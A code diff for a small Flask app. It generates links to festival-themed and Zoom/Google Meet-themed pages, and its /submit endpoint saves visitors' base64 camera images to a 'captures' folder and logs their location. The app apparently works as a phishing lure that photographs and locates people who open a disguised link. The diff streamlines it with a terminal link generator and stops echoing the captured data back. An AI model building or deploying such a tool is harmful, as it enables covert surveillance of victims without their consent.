@@ -1,8 +1,9 @@
-from flask import Flask, request, render_template, jsonify, send_from_directory
+from flask import Flask, request, render_template, jsonify
 import os
+import threading
+import webbrowser
 from datetime import datetime
 import base64
-import geocoder
 
 app = Flask(__name__)
 
@@ -11,17 +12,19 @@ MEETINGS = ["zoom", "google meet", "class meet"]
 
 @app.route("/")
 def home():
-    return render_template("home.html")
+    return "Use terminal to select festival/meeting."
 
-@app.route("/enter", methods=["POST"])
-def enter():
-    user_input = request.form.get("name", "").strip().lower()
-    if user_input in FESTIVALS:
-        return render_template(f"festivals/{user_input.replace(' ', '_')}.html")
-    elif user_input in MEETINGS:
-        return render_template(f"meetings/{user_input.replace(' ', '_')}.html")
-    else:
-        return "<h3>Festival or meeting not found. Try again.</h3>", 404
+@app.route("/festival/<name>")
+def festival(name):
+    if name.lower() in FESTIVALS:
+        return render_template(f"festivals/{name.lower()}.html")
+    return "Festival not found", 404
+
+@app.route("/meeting/<name>")
+def meeting(name):
+    if name.lower() in MEETINGS:
+        return render_template(f"meetings/{name.lower().replace(' ', '_')}.html")
+    return "Meeting not found", 404
 
 @app.route("/submit", methods=["POST"])
 def submit():
@@ -33,8 +36,26 @@ def submit():
         f.write(base64.b64decode(image_data))
     print(f"[📍] Location: {location}")
     print(f"[📷] Image saved: {filename}")
-    return jsonify({"status": "ok", "location": location, "image": filename})
+    return jsonify({"status": "ok"})
+
+def terminal_interface():
+    print("🎉 Festival & Meeting URL Generator")
+    print("Type 'exit' to quit.")
+    while True:
+        inp = input("\nEnter festival/meeting name: ").strip().lower()
+        if inp == "exit":
+            print("Exiting...")
+            os._exit(0)
+        if inp in FESTIVALS:
+            url = f"http://127.0.0.1:5000/festival/{inp}"
+            print(f"✅ URL: {url}")
+        elif inp in MEETINGS:
+            url = f"http://127.0.0.1:5000/meeting/{inp.replace(' ', '_')}"
+            print(f"✅ URL: {url}")
+        else:
+            print("❌ Not found. Try again.")
 
 if __name__ == "__main__":
     os.makedirs("captures", exist_ok=True)
-    app.run(debug=True)
+    threading.Thread(target=lambda: app.run(host="127.0.0.1", port=5000, debug=False)).start()
+    terminal_interface()
